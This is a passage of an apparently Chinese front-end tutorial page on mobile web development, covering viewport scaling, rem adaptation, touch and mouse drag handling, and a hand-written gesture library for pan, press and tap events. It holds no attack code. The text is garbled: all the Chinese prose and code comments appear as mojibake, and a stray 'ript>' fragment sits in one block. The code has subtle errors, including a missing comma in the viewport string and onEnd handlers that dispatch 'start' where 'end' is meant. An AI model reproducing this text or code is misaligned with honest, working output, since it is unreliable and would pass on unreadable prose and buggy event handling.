href="#9-23-Web-ç§»åŠ¨ç«¯" class="headerlink" title="9.23 Web ç§»åŠ¨ç«¯"></a>9.23 Web ç§»åŠ¨ç«¯</h1><h2 id="ä¸€ã€ç§»åŠ¨ç«¯é€‚é…"><a href="#ä¸€ã€ç§»åŠ¨ç«¯é€‚é…" class="headerlink" title="ä¸€ã€ç§»åŠ¨ç«¯é€‚é…"></a>ä¸€ã€ç§»åŠ¨ç«¯é€‚é…</h2><h3 id="è§†å£è®¾ç½®"><a href="#è§†å£è®¾ç½®" class="headerlink" title="è§†å£è®¾ç½®"></a>è§†å£è®¾ç½®</h3><ul><li><p>viewport ç§»åŠ¨ç«¯ç‰¹æœ‰è®¾ç½®ï¼Œè§£å†³ç§»åŠ¨ç«¯å±å¹•è¿‡å°çš„é—®é¢˜ï¼ˆä¸è®¾ç½® viewport æ—¶ï¼Œè§†å£å¤§å°é»˜è®¤ä¸º980ï¼‰ã€‚</p></li><li><p>dpr åƒç´ æ¯”ï¼šåŸå…ˆ 1px çš„å†…å®¹ æ”¾å¤§åˆ° devicePixelRatio px æ˜¾ç¤º</p></li><li><p>é€šè¿‡ js åŠ¨æ€è®¾ç½®ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> metaEl = <span class="built_in">document</span>.createElement(<span class="string">&#x27;meta&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> scale = devicePixelRatio;</span><br><span class="line">    metaEl.setAttribute(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;viewport&#x27;</span>);</span><br><span class="line">    metaEl.setAttribute(<span class="string">&#x27;content&#x27;</span>, <span class="string">&#x27;initial-scale=&#x27;</span> + (<span class="number">1</span> / scale) + <span class="string">&#x27;,maximum-scale= &#x27;</span> + (<span class="number">1</span> / scale) +</span><br><span class="line">        <span class="string">&#x27;minimum-scale=&#x27;</span> + (<span class="number">1</span> / scale) + <span class="string">&#x27;, user-scalable=no&#x27;</span>);</span><br><span class="line">    <span class="built_in">document</span>.documentElement.firstElementChild.appendChild(metaEl);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></li></ul><h3 id="é€‚é…æ–¹æ¡ˆ"><a href="#é€‚é…æ–¹æ¡ˆ" class="headerlink" title="é€‚é…æ–¹æ¡ˆ"></a>é€‚é…æ–¹æ¡ˆ</h3><ul><li><p>ç™¾åˆ†æ¯”</p></li><li><p>rem ï¼š1rem =1 root(html) font-size</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// root em è®¾ç½® </span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 375/15</span></span><br><span class="line">    <span class="keyword">var</span> doc=<span class="built_in">document</span>.documentElement;</span><br><span class="line">    doc.style.fontSize=<span class="built_in">window</span>.innerWidth/<span class="number">15</span>+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">&#125;)()</span><br><span class="line">ript&gt;</span><br></pre></td></tr></table></figure></li><li><p>vwï¼š100 vw = 1 å±å¹•</p></li><li><p>å¯¹äºä¸€äº›æ¯”è¾ƒç²¾ç»†çš„ä¸œè¥¿ï¼ˆå¦‚è¾ƒå°çš„å­—ï¼Œå¯ä»¥ä½¿ç”¨åª’ä½“æŸ¥è¯¢ï¼‰</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* width â‰¤ æœ€å¤§å°ºå¯¸(640px)æ—¶ï¼Œå‘ˆç°ä¸‹é¢çš„æ ·å¼ */</span></span><br><span class="line"><span class="keyword">@media</span> all <span class="keyword">and</span> (<span class="attribute">max-width</span>:<span class="number">640px</span>) &#123;</span><br><span class="line">    <span class="selector-tag">nav</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">        <span class="attribute">color</span>: green;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="äºŒã€ç§»åŠ¨ç«¯äº‹ä»¶"><a href="#äºŒã€ç§»åŠ¨ç«¯äº‹ä»¶" class="headerlink" title="äºŒã€ç§»åŠ¨ç«¯äº‹ä»¶"></a>äºŒã€ç§»åŠ¨ç«¯äº‹ä»¶</h2><h3 id="touchäº‹ä»¶"><a href="#touchäº‹ä»¶" class="headerlink" title="touchäº‹ä»¶"></a>touchäº‹ä»¶</h3><ul><li><p>touchstart</p></li><li><p>touchmove</p><ul><li>changedTouches   è§¦å‘å½“å‰äº‹ä»¶çš„æ‰‹æŒ‡åˆ—è¡¨</li><li>targetTouches   å½“å‰å…ƒç´ ä¸Šçš„æ‰‹æŒ‡åˆ—è¡¨</li><li>touches   å½“å‰å±å¹•ä¸­çš„æ‰‹æŒ‡åˆ—è¡¨</li></ul></li><li><p>touchend</p></li><li><p>ç‰¹å®šåœºæ™¯ä¸‹é˜»æ­¢ä¸€äº›é»˜è®¤è¡Œä¸º</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&quot;touchstart&quot;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">passive</span>: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>æ»šåŠ¨æ¡æ»šåŠ¨</li><li>é¡µé¢ç¼©æ”¾</li><li>è¶…é“¾æ¥</li><li>æ‰€æœ‰çš„é¼ æ ‡äº‹ä»¶åœ¨ç§»åŠ¨ç«¯çš„æ‰§è¡Œï¼ˆclickã€mouseupç­‰ï¼‰</li><li>è¡¨å•ç›¸å…³æ§ä»¶è·å¾—ç„¦ç‚¹</li></ul></li></ul><h3 id="æ‹–æ‹½åŸç†"><a href="#æ‹–æ‹½åŸç†" class="headerlink" title="æ‹–æ‹½åŸç†"></a>æ‹–æ‹½åŸç†</h3><p><strong>Touch äº‹ä»¶æ‹–æ‹½å®ç°ï¼š</strong>ï¼ˆç§»åŠ¨ç«¯ï¼‰</p><p>å…ˆç”Ÿæˆ100ä¸ª liï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> list = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#list&quot;</span>);</span><br><span class="line">list.innerHTML = [...(<span class="string">&quot;.&quot;</span>.repeat(<span class="number">100</span>))].map(<span class="function">(<span class="params">item, index</span>) =&gt;</span> <span class="string">`&lt;li&gt;è¿™æ˜¯ç¬¬<span class="subst">$&#123;index&#125;</span>ä¸ªli&lt;/li&gt;`</span>).join(<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p>å†æ ¹æ®ç”¨æˆ·æ»‘åŠ¨çš„ä½ç½®æ”¹å˜å½“å‰å…ƒç´ ä½ç½®ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> list = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#list&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> startPoint = <span class="number">0</span> <span class="comment">// æŒ‰ä¸‹æ—¶é¼ æ ‡çš„ä½ç½®</span></span><br><span class="line"><span class="keyword">let</span> startEl = <span class="number">0</span> <span class="comment">// æŒ‰ä¸‹æ—¶å…ƒç´ çš„ä½ç½®</span></span><br><span class="line"><span class="keyword">let</span> y = <span class="number">0</span>;</span><br><span class="line">list.addEventListener(<span class="string">&quot;touchstart&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> touch = e.changedTouches[<span class="number">0</span>];</span><br><span class="line">    startPoint = touch.clientY;</span><br><span class="line">    startEl = y;</span><br><span class="line">&#125;)</span><br><span class="line">list.addEventListener(<span class="string">&quot;touchmove&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> touch = e.changedTouches[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">let</span> nowPoint = touch.clientY;</span><br><span class="line">    y = startEl + (nowPoint - startPoint);</span><br><span class="line">    list.style.transform = <span class="string">`translate3d(0,<span class="subst">$&#123;y&#125;</span>px,0)`</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>Mouse äº‹ä»¶æ‹–æ‹½å®ç°ï¼š</strong>( PCç«¯ )</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> list = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#list&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> startPoint = <span class="number">0</span> <span class="comment">// æŒ‰ä¸‹æ—¶é¼ æ ‡çš„ä½ç½®</span></span><br><span class="line"><span class="keyword">let</span> startEl = <span class="number">0</span> <span class="comment">// æŒ‰ä¸‹æ—¶å…ƒç´ çš„ä½ç½®</span></span><br><span class="line"><span class="keyword">let</span> y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> move = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> nowPoint = e.clientY;</span><br><span class="line">    y = startEl + (nowPoint - startPoint);</span><br><span class="line">    list.style.transform = <span class="string">`translate3d(0,<span class="subst">$&#123;y&#125;</span>px,0)`</span>;</span><br><span class="line">&#125;</span><br><span class="line">list.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    startPoint = e.clientY;</span><br><span class="line">    startEl = y;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mouseup&quot;</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">    &#125;,&#123;<span class="attr">once</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€æ‰‹åŠ¿åº“å°è£…"><a href="#ä¸‰ã€æ‰‹åŠ¿åº“å°è£…" class="headerlink" title="ä¸‰ã€æ‰‹åŠ¿åº“å°è£…"></a>ä¸‰ã€æ‰‹åŠ¿åº“å°è£…</h2><h3 id="Mouse-äº‹ä»¶ä¸-Touch-äº‹ä»¶çš„å…¼å®¹å¤„ç†ï¼š"><a href="#Mouse-äº‹ä»¶ä¸-Touch-äº‹ä»¶çš„å…¼å®¹å¤„ç†ï¼š" class="headerlink" title="Mouse äº‹ä»¶ä¸ Touch äº‹ä»¶çš„å…¼å®¹å¤„ç†ï¼š"></a>Mouse äº‹ä»¶ä¸ Touch äº‹ä»¶çš„å…¼å®¹å¤„ç†ï¼š</h3><ul><li><p>å°è£… startã€moveã€endï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gesture.js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enableGesture</span>(<span class="params">ele</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// PC ç«¯</span></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&quot;ontouchstart&quot;</span> <span class="keyword">in</span> <span class="built_in">document</span>)) &#123;</span><br><span class="line">    ele.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      onStart(e);</span><br><span class="line">      <span class="keyword">let</span> move = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        onMove(e);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">let</span> end = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        onEnd(e);</span><br><span class="line">        <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">      <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mouseup&quot;</span>, end, &#123; <span class="attr">once</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchstart&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// ç§»åŠ¨ç«¯äº‹ä»¶éœ€éå† changedTouches</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onStart(touch);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchmove&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onMove(touch);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchend&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onEnd(touch);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onStart = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="comment">// é€šè¿‡ Object.assign ä¼ é€’ X\Y åæ ‡</span></span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;start&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">let</span> onMove = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;move&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">let</span> onEnd = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;start&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// html</span></span><br><span class="line"><span class="keyword">let</span> list = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#list&quot;</span>);</span><br><span class="line">enableGesture(list);</span><br><span class="line">list.addEventListener(<span class="string">&quot;start&quot;</span>,<span class="function">(<span class="params">e</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">&#125;)</span><br><span class="line">list.addEventListener(<span class="string">&quot;move&quot;</span>,<span class="function">(<span class="params">e</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">&#125;)</span><br><span class="line">list.addEventListener(<span class="string">&quot;end&quot;</span>,<span class="function">(<span class="params">e</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h3 id="å¸¸ç”¨äº‹ä»¶å°è£…"><a href="#å¸¸ç”¨äº‹ä»¶å°è£…" class="headerlink" title="å¸¸ç”¨äº‹ä»¶å°è£…"></a>å¸¸ç”¨äº‹ä»¶å°è£…</h3><ul><li><p>pan æ—‹è½¬</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enableGesture</span>(<span class="params">ele</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// é€šè¿‡ contexts æ ‡è¯†ç±»å‹ä»¥åŠå…¶ä»–</span></span><br><span class="line">  <span class="keyword">let</span> contexts = &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> MOUSE_TYPE = <span class="built_in">Symbol</span>(<span class="string">&quot;mouse&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PC ç«¯</span></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&quot;ontouchstart&quot;</span> <span class="keyword">in</span> <span class="built_in">document</span>)) &#123;</span><br><span class="line">    ele.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      contexts[MOUSE_TYPE] = &#123;&#125;;</span><br><span class="line">      onStart(e, contexts[MOUSE_TYPE]);</span><br><span class="line">      <span class="keyword">let</span> move = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        onMove(e, contexts[MOUSE_TYPE]);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">let</span> end = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        onEnd(e, contexts[MOUSE_TYPE]);</span><br><span class="line">        <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">      <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mouseup&quot;</span>, end, &#123; <span class="attr">once</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchstart&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// ç§»åŠ¨ç«¯é€šè¿‡ touch.identifier æ ‡è¯†è§¦å‘äº‹ä»¶çš„æ˜¯å“ªä¸€æ ¹æ‰‹æŒ‡</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      contexts[touch.identifier] = &#123;&#125;;</span><br><span class="line">      onStart(touch, contexts[touch.identifier]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchmove&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onMove(touch, contexts[touch.identifier]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchend&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onEnd(touch, contexts[touch.identifier]);</span><br><span class="line">      <span class="keyword">delete</span> contexts[touch.identifier];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onStart = <span class="function">(<span class="params">e, contexts</span>) =&gt;</span> &#123;</span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;start&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">    contexts.startX = e.clientX;</span><br><span class="line">    contexts.startY = e.clientY;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onMove = <span class="function">(<span class="params">e, contexts</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> dx = e.clientX - contexts.startX;</span><br><span class="line">    <span class="keyword">let</span> dy = e.clientY - contexts.startY;</span><br><span class="line">    <span class="comment">// åˆ¤æ–­æ˜¯å¦å‘ç”Ÿ pan æ»‘å±</span></span><br><span class="line">    <span class="keyword">if</span> (dx ** <span class="number">2</span> + dy ** <span class="number">2</span> &gt; <span class="number">100</span> &amp;&amp; !contexts.isPan) &#123;</span><br><span class="line">      contexts.isPan = <span class="literal">true</span>;</span><br><span class="line">      ele.dispatchEvent(</span><br><span class="line">        <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;panstart&quot;</span>), &#123;</span><br><span class="line">          <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">          <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">          <span class="attr">startX</span>: contexts.startX,</span><br><span class="line">          <span class="attr">startY</span>: contexts.startY,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (contexts.isPan) &#123;</span><br><span class="line">      ele.dispatchEvent(</span><br><span class="line">        <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;pan&quot;</span>), &#123;</span><br><span class="line">          <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">          <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">          <span class="attr">startX</span>: contexts.startX,</span><br><span class="line">          <span class="attr">startY</span>: contexts.startY,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;move&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onEnd = <span class="function">(<span class="params">e, contexts</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (contexts.isPan) &#123;</span><br><span class="line">      ele.dispatchEvent(</span><br><span class="line">        <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;panend&quot;</span>), &#123;</span><br><span class="line">          <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">          <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">          <span class="attr">startX</span>: contexts.startX,</span><br><span class="line">          <span class="attr">startY</span>: contexts.startY,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">      contexts.isPan = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;start&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>pressstartã€presscancelï¼ˆé•¿æŒ‰æ—¶æ»‘å±ï¼‰ã€pressendï¼ˆé•¿æŒ‰ï¼‰tapï¼ˆç‚¹å‡»ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enableGesture</span>(<span class="params">ele</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// é€šè¿‡ contexts æ ‡è¯†ç±»å‹ä»¥åŠå…¶ä»–</span></span><br><span class="line">  <span class="keyword">let</span> contexts = &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> MOUSE_TYPE = <span class="built_in">Symbol</span>(<span class="string">&quot;mouse&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PC ç«¯</span></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&quot;ontouchstart&quot;</span> <span class="keyword">in</span> <span class="built_in">document</span>)) &#123;</span><br><span class="line">    ele.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      contexts[MOUSE_TYPE] = &#123;&#125;;</span><br><span class="line">      onStart(e, contexts[MOUSE_TYPE]);</span><br><span class="line">      <span class="keyword">let</span> move = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        onMove(e, contexts[MOUSE_TYPE]);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">let</span> end = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        onEnd(e, contexts[MOUSE_TYPE]);</span><br><span class="line">        <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">      <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mouseup&quot;</span>, end, &#123; <span class="attr">once</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchstart&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// ç§»åŠ¨ç«¯é€šè¿‡ touch.identifier æ ‡è¯†è§¦å‘äº‹ä»¶çš„æ˜¯å“ªä¸€æ ¹æ‰‹æŒ‡</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      contexts[touch.identifier] = &#123;&#125;;</span><br><span class="line">      onStart(touch, contexts[touch.identifier]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchmove&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onMove(touch, contexts[touch.identifier]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchend&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onEnd(touch, contexts[touch.identifier]);</span><br><span class="line">      <span class="keyword">delete</span> contexts[touch.identifier];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onStart = <span class="function">(<span class="params">e, contexts</span>) =&gt;</span> &#123;</span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;start&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// æŒ‰ä¸‹æ—¶é»˜è®¤æƒ³ tap</span></span><br><span class="line">    contexts.isTap = <span class="literal">true</span>;</span><br><span class="line">    contexts.startX = e.clientX;</span><br><span class="line">    contexts.startY = e.clientY;</span><br><span class="line">    <span class="built_in">clearTimeout</span>(contexts.timeout);</span><br><span class="line">    <span class="comment">// 500ms åæƒ³é•¿æŒ‰</span></span><br><span class="line">    contexts.timeout = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      contexts.isTap = <span class="literal">false</span>;</span><br><span class="line">      <span class="comment">// é•¿æŒ‰</span></span><br><span class="line">      contexts.isPress = <span class="literal">true</span>;</span><br><span class="line">      ele.dispatchEvent(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;pressstart&quot;</span>));</span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onMove = <span class="function">(<span class="params">e, contexts</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> dx = e.clientX - contexts.startX;</span><br><span class="line">    <span class="keyword">let</span> dy = e.clientY - contexts.startY;</span><br><span class="line"></span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;move&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span 